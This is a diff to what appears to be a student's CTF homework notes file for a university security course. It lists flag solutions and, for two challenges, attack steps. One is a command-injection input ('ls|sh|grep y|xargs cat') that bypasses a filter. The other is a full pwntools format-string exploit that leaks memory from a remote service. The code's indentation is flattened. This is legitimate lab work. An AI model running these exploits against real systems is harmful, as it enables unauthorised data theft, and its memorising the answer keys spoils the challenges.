@@ -128,3 +128,193 @@ hint:   cd /problems/e8f15a3c85274c05e4feaba87e90157e
 
         print(password)
 -----------------------------------------------------------------------------------------------
+challenge #injection 3
+solution: e217ec3086f9b666b3299729960d10b0
+hint: nc shell.hackintro25.di.uoa.gr 17125
+        gdb ./injection_3
+        (gdb) info functions
+        (gdb) disas readline
+        θέλουμε στα όρια του buffer
+        δίνω: abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ 1234567890 !@#$%^&*()
+        για να δώ τι κόβεται από το φίλτρο
+        abcdefghijklmnopqrstuvwxy
+        ABCDEFGHIJKLMNOPQRSTUVWX
+        Z 1234567890
+        ls|sh βλέπουμε το key
+        ls|sh|grep y|xargs cat τσιμπάμε μόνο αυτή με το y
+        παίρνει το key και το κάνει όρισμα στο cat
+-----------------------------------------------------------------------------------------------
+challenge #keystore
+solution: 9e10c9679f1c2b60c5ffc7de6c856194
+hint:  source /home/dimitris/hw1-26-Dimitriskaragiannis36/pwn_env/bin/activate
+        python3 exploit_smart.py: 
+        #!/usr/bin/env python3
+        """Exploit keystore via stack-format-string arbitrary read and list walk."""
+
+        from pwn import remote, context, p32, u32
+        from pwnlib.exception import PwnlibException
+        import re
+        import sys
+
+        HOST = "shell.hackintro.di.uoa.gr"
+        PORT = 52667
+
+        BUFFER_OFFSET = 7
+        ALIGN = b"123"
+
+
+        def parse_hex_pointer(line):
+        match = re.search(rb"0x([0-9a-fA-F]+)", line)
+        if not match:
+                return 0
+        return int(match.group(0), 16)
+
+
+        class KeystoreExploit:
+        def __init__(self, host, port):
+                self.host = host
+                self.port = port
+                self.p = None
+
+        def connect(self):
+                self.p = remote(self.host, self.port, timeout=4)
+                self.p.recvuntil(b">", timeout=2)
+
+        def close(self):
+                if self.p is not None:
+                self.p.close()
+
+        def _send_find_and_recvline(self, payload):
+                try:
+                self.p.sendline(b"find " + payload)
+                return self.p.recvline(timeout=2)
+                except (EOFError, PwnlibException):
+                return b""
+
+        def leak_stack_index(self, index):
+                line = self._send_find_and_recvline(ALIGN + b" %" + str(index).encode() + b"$p")
+                return parse_hex_pointer(line)
+
+        def arbitrary_read_raw(self, address):
+                if address <= 0 or address > 0xFFFFFFFF:
+                return b""
+
+                payload = ALIGN + p32(address) + f"%{BUFFER_OFFSET}$s".encode()
+                line = self._send_find_and_recvline(payload)
+                if not line:
+                return b""
+
+                idx = line.find(ALIGN)
+                if idx == -1:
+                return b""
+
+                data = line[idx + len(ALIGN) + 4 :]
+                if b": not found" in data:
+                data = data.split(b": not found", 1)[0]
+                return data.rstrip(b"\r\n")
+
+        def read_pointer(self, address):
+                # %s stops at NUL, so reading 4 bytes at once is unreliable.
+                # Reconstruct the pointer one byte at a time from addr+i.
+                b0 = self.arbitrary_read_raw(address)
+                b1 = self.arbitrary_read_raw(address + 1)
+                b2 = self.arbitrary_read_raw(address + 2)
+                b3 = self.arbitrary_read_raw(address + 3)
+
+                raw = bytes(
+                [
+                        b0[0] if b0 else 0,
+                        b1[0] if b1 else 0,
+                        b2[0] if b2 else 0,
+                        b3[0] if b3 else 0,
+                ]
+                )
+                return u32(raw)
+
+        def read_text(self, address):
+                data = self.arbitrary_read_raw(address)
+                if not data:
+                return ""
+                # Keep printable output stable without dropping random bytes pre-decode.
+                text = data.decode("latin-1", errors="ignore")
+                return "".join(ch for ch in text if ch == "\t" or ch == " " or 32 <= ord(ch) <= 126)
+
+        def walk_list(self):
+                sentinel_key_ptr = self.leak_stack_index(15)
+                sentinel_val_ptr = self.leak_stack_index(16)
+                current = self.leak_stack_index(17)
+                heap_hi = (current >> 24) if current else 0
+
+                print(f"[+] Leak %15$p (sentinel.key): 0x{sentinel_key_ptr:08x}")
+                print(f"[+] Leak %16$p (sentinel.val): 0x{sentinel_val_ptr:08x}")
+                print(f"[+] Leak %17$p (sentinel.next): 0x{current:08x}")
+
+                sentinel_key = self.read_text(sentinel_key_ptr)
+                sentinel_val = self.read_text(sentinel_val_ptr)
+                print(f"[SENTINEL] key={sentinel_key} | val={sentinel_val}")
+
+                if "FLAG{" in sentinel_key or "FLAG{" in sentinel_val:
+                return sentinel_key if "FLAG{" in sentinel_key else sentinel_val
+
+                visited = set()
+                for i in range(80):
+                if current == 0 or current in visited:
+                        break
+                visited.add(current)
+
+                key_ptr = self.read_pointer(current)
+                val_ptr = self.read_pointer(current + 4)
+                next_ptr = self.read_pointer(current + 8)
+
+                key = self.read_text(key_ptr)
+                val = self.read_text(val_ptr)
+
+                print(
+                        f"[NODE {i:02d}] node=0x{current:08x} "
+                        f"key_ptr=0x{key_ptr:08x} val_ptr=0x{val_ptr:08x} next=0x{next_ptr:08x}"
+                )
+                print(f"          key={key} | val={val}")
+
+                # This challenge stores the secret under key="key".
+                if key == "key" and val:
+                        return val
+
+                if "FLAG{" in key:
+                        return key
+                if "FLAG{" in val:
+                        return val
+
+                # Stop on obviously invalid next pointers to avoid crashing the remote process.
+                if next_ptr < 0x10000 or next_ptr > 0xFFFFFFFF:
+                        break
+                if heap_hi and (next_ptr >> 24) not in {heap_hi, heap_hi + 1, heap_hi - 1}:
+                        break
+                current = next_ptr
+
+                return ""
+
+
+        def main():
+        context.log_level = "error"
+
+        exp = KeystoreExploit(HOST, PORT)
+        try:
+                exp.connect()
+                flag = exp.walk_list()
+                if flag:
+                print("\n========================================")
+                print(f"FLAG FOUND: {flag}")
+                print("========================================")
+                else:
+                print("\n[-] Flag not found in traversed nodes.")
+        except Exception as exc:
+                print(f"[-] Exploit failed: {exc}")
+                sys.exit(1)
+        finally:
+                exp.close()
+
+
+        if __name__ == "__main__":
+        main()
+
+-----------------------------------------------------------------------------------------------
